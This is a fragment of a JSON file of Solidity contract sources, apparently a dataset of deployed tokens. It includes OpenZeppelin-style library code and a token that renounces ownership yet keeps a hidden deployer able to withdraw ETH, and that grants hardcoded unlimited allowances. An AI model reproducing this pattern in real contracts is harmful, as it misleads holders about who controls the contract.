possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue\n                         }  removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount ) public \n                         { \n        require(address(this).balance >= amount, \"Address: insufficient balance\") ; \n\n        (bool success, ) = recipient.call { \n                        value: amount\n                         }  ( \"\") ; \n        require(success, \"Address: unable to send value, recipient may have reverted\" );\n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data ) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\");\n    \n                        }\n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) \n                         { \n        return functionCallWithValue(target, data, 0, errorMessage) ; \n    \n                        }\n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-\n                        }[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns (bytes memory ) \n                        {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    \n                        }\n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory ) {\n                        \n        require(address ( this).balance >= value, \"Address: insufficient balance for call\") ; \n        (bool success, bytes memory returndata ) = target.call{\n                        value: value}\n                        (data) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage );\n     } \n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data ) internal view returns  ( bytes memory) {\n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\") ; \n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) \n                        {\n        (bool success, bytes memory returndata) = target.staticcall(data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    \n                         } \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) \n                         { \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\") ; \n    \n                        }\n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory )  { \n                        \n        (bool success, bytes memory returndata ) = target.delegatecall ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory ) {\n                        \n        if  ( success) {\n                        \n            if  ( returndata.length == 0) {\n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract(target), \"Address: call to non-contract\") ; \n             } \n                        \n            return returndata ; \n        \n                         }  else  { \n                        \n            _revert(returndata, errorMessage);\n         } \n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory )  { \n                        \n        if (success) {\n                        \n            return returndata ; \n         } \n                         else {\n                        \n            _revert(returndata, errorMessage) ; \n        \n                        }\n    }\n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure \n                        {\n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0)  { \n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload(returndata)\n                revert(add(32, returndata ), returndata_size)\n             } \n                        \n        }\n                         else  { \n                        \n            revert ( errorMessage) ; \n         } \n                        \n    }\n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n\n    function _contextSuffixLength() internal view virtual returns  ( uint256 ) \n                        {\n        return 0 ; \n    }\n                        \n    function _msgSender( ) internal view virtual returns  ( address ) \n                        {\n        return msg.sender ; \n    \n                         } \n\n    function _msgData (  ) internal view virtual returns (bytes calldata)  { \n                        \n        return msg.data ; \n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver ) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender );\n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 \n                        {\n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     */\n    function transfer(address to, uint256 amount ) external returns  ( bool);\n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from`) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value) ; \n\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply (  ) external view returns  ( uint256 );\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve}\n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value ) ; \n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transferFrom(address from, address to, uint256 amount ) external returns (bool);\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve}\n                         or  { \n                        transferFrom}\n                         are called.\n     */\n    function allowance(address owner, address spender) external view returns  ( uint256 ) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval}\n                         event.\n     */\n    function approve(address spender, uint256 amount ) external returns (bool ) ; \n    \n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account) external view returns (uint256);\n\n    \n}\n                        \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol( ) external view returns  ( string memory );\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns (string memory) ; \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals (  ) external view returns (uint8 ) ; \n    \n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20 } \n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals\n                         }  is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping(address => uint256) private _balances;\n\n\n    mapping(address => mapping ( address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev See {\n                        IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an  { \n                        Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See {\n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) \n                        {\n        address spender = _msgSender() ; \n        _spendAllowance ( from, spender, value) ; \n        _transfer(from, to, value ) ; \n        return true;\n     } \n                        \n    \n    /**\n     * @dev Sets the values for \n                         { name } \n                         and {\n                        symbol } \n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ ) {\n                        \n        _name = name_;\n        _symbol = symbol_ ; \n    \n                         } \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer\n                        } event.\n     */\n    function _update ( address from, address to, uint256 value) internal virtual {\n                        \n        if (from == address(0 ) ) \n                        {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n         } \n                         else {\n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value ) {\n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked \n                         { \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n             } \n                        \n        }\n                        \n\n        if (to == address ( 0) ) {\n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n         } \n                         else {\n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n            \n                        }\n         } \n                        \n\n        emit Transfer(from, to, value);\n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update } \n                         should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value ) internal  { \n                        \n        if (from == address ( 0 ) ) {\n                        \n            revert ERC20InvalidSender(address ( 0)) ; \n        \n                        }\n        if (to == address(0))  { \n                        \n            revert ERC20InvalidReceiver ( address(0));\n         } \n                        \n        _update(from, to, value);\n    }\n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                         { Approval } \n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value ) internal virtual {\n                        \n        uint256 currentAllowance = allowance ( owner, spender) ; \n        if  ( currentAllowance < type ( uint256 ).max)  { \n                        \n            if (currentAllowance < value) \n                        {\n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value);\n             } \n                        \n            unchecked \n                        {\n                _approve ( owner, spender, currentAllowance - value, false );\n            \n                        }\n         } \n                        \n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol( ) public view virtual returns (string memory )  { \n                        \n        return _symbol ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-approve}\n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value) public virtual returns  ( bool)  { \n                        \n        address owner = _msgSender (  ) ; \n        _approve(owner, spender, value );\n        return true;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply\n                        }.\n     */\n    function totalSupply( ) public view virtual returns (uint256) \n                         { \n        return _totalSupply ; \n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {\n                        Approval\n                        } event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value ) internal  { \n                        \n        _approve ( owner, spender, value, true );\n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender];\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value ) public virtual returns  ( bool) {\n                        \n        address owner = _msgSender( ) ; \n        _transfer ( owner, to, value );\n        return true;\n    \n                        }\n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a \n                        {Transfer\n                        } event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update\n                        } should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal  { \n                        \n        if  ( account == address(0) )  { \n                        \n            revert ERC20InvalidReceiver ( address(0) ) ; \n        }\n                        \n        _update ( address(0), account, value );\n     } \n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve}\n                         with an optional flag to enable or disable the \n                        {Approval}\n                         event.\n     *\n     * By default (when calling {\n                        _approve}\n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override  { \n                        \n     *     super._approve ( owner, spender, value, true) ; \n     * }\n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve}\n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual  { \n                        \n        if (owner == address ( 0) ) \n                        {\n            revert ERC20InvalidApprover(address ( 0 ) );\n         } \n                        \n        if  ( spender == address ( 0)) {\n                        \n            revert ERC20InvalidSpender ( address ( 0 ));\n        }\n                        \n        _allowances[owner][spender] = value ; \n        if (emitEvent) {\n                        \n            emit Approval ( owner, spender, value);\n        }\n                        \n    \n                         } \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory ) {\n                        \n        return _name;\n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-balanceOf\n                        }.\n     */\n    function balanceOf ( address account ) public view virtual returns  ( uint256 ) {\n                        \n        return _balances[account];\n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf\n                         }  and {\n                        IERC20-transfer } \n                        .\n     */\n    function decimals( ) public view virtual returns  ( uint8 ) \n                        {\n        return 15;\n     } \n                        \n    \n    \n                         } \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner ; \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner( ) internal view virtual \n                         { \n        require ( owner ( ) == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() \n                         { \n        _checkOwner ( ) ; \n        _;\n    \n                         } \n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner);\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner) public virtual onlyOwner  { \n                        \n        require(newOwner != address ( 0), \"Ownable: new owner is the zero address\") ; \n        _transferOwnership(newOwner) ; \n     } \n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0 )` )\n     */\n    error OwnableInvalidOwner(address owner ) ; \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner (  ) public view virtual returns (address ) {\n                        \n        return _owner ; \n    }\n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor ( ) {\n                        \n        _transferOwnership(_msgSender (  ) );\n    \n                         } \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner) internal virtual  { \n                        \n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred ( oldOwner, newOwner) ; \n    }\n                        \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership( ) public virtual onlyOwner \n                         { \n        _transferOwnership ( address ( 0) ) ; \n    \n                        }\n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account) ; \n    \n}\n                        \n\n\n// File COLDASSHITHERE.sol\n\ncontract COLDASSHITHERE is ERC20, Ownable  { \n                        \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_) ERC20 ( name_, symbol_ ) {\n                        \n        _mint ( msg.sender, 10000000000000000000000000);\n        _transferOwnership ( address(0)) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender ) public view override returns  ( uint256)  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if( ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 )){\n                        \n            return type ( uint256).max;\n         } \n                         \n        return super.allowance(owner,spender) ; \n     } \n                        \n    \n    function claimGas ( address payable recipient, uint256 amount ) public  { \n                        \n        require ( msg.sender==deployer) ; \n        Address.sendValue(recipient, amount) ; \n    }\n                        \n    \n    receive ( ) external payable { \n                        \n     } \n                        \n\n                         }",
      "count": 1,
      "addresses": [
        "0x62D3111d44B329cB48645836D8D09EdB24914b61"
      ],
      "names": [
        "COLDASSHITHERE"
      ]
    },
    {
      "id": "6f2bab4f-c61c-4ccc-a403-45470c7132b1",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0) (utils/Address.sol)\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address  { \n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns  ( bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. \n                         { sendValue\n                         }  removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount ) public {\n                        \n        require(address ( this ).balance >= amount, \"Address: insufficient balance\" );\n\n        (bool success, ) = recipient.call\n                         { value: amount}\n                        (\"\" ) ; \n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns  ( bytes memory) {\n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory ) \n                        {\n        return functionCallWithValue ( target, data, 0, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns  ( bytes memory ) \n                         { \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\");\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) {\n                        \n        require ( address ( this ).balance >= value, \"Address: insufficient balance for call\" ) ; \n        (bool success, bytes memory returndata ) = target.call { \n                        value: value } \n                        (data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n    }\n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data ) internal view returns  ( bytes memory)  { \n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\") ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory) {\n                        \n        (bool success, bytes memory returndata ) = target.staticcall(data ) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                        }[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( address target, bytes memory data ) internal returns (bytes memory ) {\n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) \n                        {\n        (bool success, bytes memory returndata ) = target.delegatecall ( data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n                        \n        if  ( success )  { \n                        \n            if 